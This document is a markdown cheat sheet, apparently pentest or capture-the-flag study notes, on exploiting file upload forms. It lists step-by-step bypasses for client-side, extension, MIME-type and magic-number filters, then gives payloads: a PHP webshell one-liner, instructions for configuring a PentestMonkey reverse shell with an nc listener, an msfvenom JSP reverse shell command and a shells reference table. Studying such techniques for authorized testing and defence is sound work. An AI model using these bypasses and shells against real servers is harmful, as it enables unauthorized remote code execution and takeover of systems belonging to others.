# File Upload Vulnerability Methodology

## 1. Enumerate First

- **Wappalyzer / response headers** — identify backend language (`Server:`, `X-Powered-By:`)
- **View page source** — look for client-side JS filters
- **Gobuster** — find upload directory and confirm where files land
  ```bash
  gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
  ```
- **Upload a benign file** (real JPEG) — confirm accepted type, observe naming scheme and file location
- Try to navigate directly: `/uploads/`, `/resources/`, `/images/`

---

## 2. Identify Filter Type

Upload a file with a clearly invalid extension (e.g. `test.invalidext`):
- **Succeeds** → extension blacklist (only specific extensions blocked)
- **Fails** → extension whitelist (only specific extensions allowed)

Re-upload your accepted innocent file with altered magic bytes — if it fails: **magic number filter** is active.

Intercept the innocent upload in Burp, change the `Content-Type` header — if it fails: **MIME filter** is active.

Upload progressively larger files to probe for **file length limits**.

---

## 3. Bypass Client-Side Filters

Four methods (pick the easiest):

1. **Disable JS in browser** — kills the filter entirely (only if site still works without JS)
2. **Burp: intercept the server response** → delete/comment out the JS filter function before it loads
   - Burp → intercept on → right-click request → Do Intercept → Response to this request → delete the JS → Forward
3. **Rename shell + fix in Burp** — rename `shell.php` → `shell.jpg`, upload it (passes filter), intercept in Burp, change filename back to `shell.php` and MIME to `text/x-php`, forward
4. **curl direct POST** — bypass the page entirely:
   ```bash
   curl -X POST -F "submit=<value>" -F "<file-param>:@shell.php" http://TARGET/upload
   ```

> Note: if the JS filter is in an external `.js` file, go to Burp Options → Intercept Client Requests → remove `^js$|` from the condition.

---

## 4. Bypass Server-Side Extension Filters

### Blacklist bypass
Try alternate PHP extensions — the blacklist often only blocks `.php` and `.phtml`:
```
.php3  .php4  .php5  .php7  .phps  .php-s  .pht  .phar
```

### Whitelist bypass — double extension trick
If the filter checks whether a whitelisted extension appears *anywhere* in the filename:
```
shell.jpg.php
```
The filter sees `.jpg` and accepts it; the server executes it as PHP.

### Null byte (older PHP < 5)
```
shell.php%00.jpg
```

---

## 5. Bypass Magic Number Filters

Server reads the first bytes of the file to verify type. Spoof them:

1. Add 4 dummy chars to the top of your shell: `AAAA`
2. Open in `hexeditor` (or `xxd` + edit)
3. Replace first 4 bytes with the target magic number

Common magic numbers:
| Type | Hex | ASCII |
|------|-----|-------|
| JPEG | `FF D8 FF DB` | `ÿØÿÛ` |
| PNG  | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG....` |
| GIF  | `47 49 46 38 39 61` | `GIF89a` |

Verify spoof worked:
```bash
file shell.php   # should now report as JPEG/PNG data
```

---

## 6. Bypass MIME Type Filters

MIME is based on extension and is set by the browser in the `Content-Type` field of the multipart request. Intercept with Burp and change:
```
Content-Type: image/jpeg   →   Content-Type: text/x-php
```

---

## 7. Deliver the Payload

### Webshell (minimal, useful when length limits apply)
```php
<?php echo system($_GET["cmd"]); ?>
```
Access: `http://TARGET/uploads/shell.php?cmd=id`
> Tip: view page source for cleaner output.

### Reverse shell
Use PentestMonkey `/usr/share/webshells/php/php-reverse-shell.php`:
- Edit `$ip` (line 49) to your `tun0` IP
- Set up listener:
  ```bash
  sudo ufw allow 4444/tcp
  nc -lvnp 4444
  ```
- Upload, then navigate to: `http://TARGET/uploads/shell.php`

### Non-PHP backends
- **Node.js** — use a JS reverse shell
- **Python** — use a `.py` webshell
- Wappalyzer / response headers will hint at the backend

---

## 8. Find Your Shell (if directory not indexable)

- Gobuster with `-x php` to brute-force the upload directory for your file
- Note: servers often rename uploads (prepend timestamp, random string) — use `-x` to hunt
- If you know the naming scheme, construct the URI directly

---

## 9. Decision Tree (quick reference)

```
Upload page found
  └─ Check source → client-side JS filter?
       ├─ Yes → disable JS / Burp intercept response / rename + Burp fix MIME+ext
       └─ No (or after bypass) → attempt shell upload
            └─ Blocked?
                 ├─ Test .invalidext → accepted? → blacklist → try .phar/.php5/etc
                 │                   → rejected? → whitelist → try double ext (shell.jpg.php)
                 ├─ MIME check? → Burp: change Content-Type
                 └─ Magic number check? → hexeditor: spoof first bytes
```

---

## Shells Quick Reference

| Backend | Webshell |
|---------|----------|
| PHP | `<?php echo system($_GET["cmd"]); ?>` |
| PHP | `/usr/share/webshells/php/php-reverse-shell.php` |
| JSP | `msfvenom -p java/jsp_shell_reverse_tcp` |
| ASP | `/usr/share/webshells/asp/` |
| ASPX | `/usr/share/webshells/aspx/` |
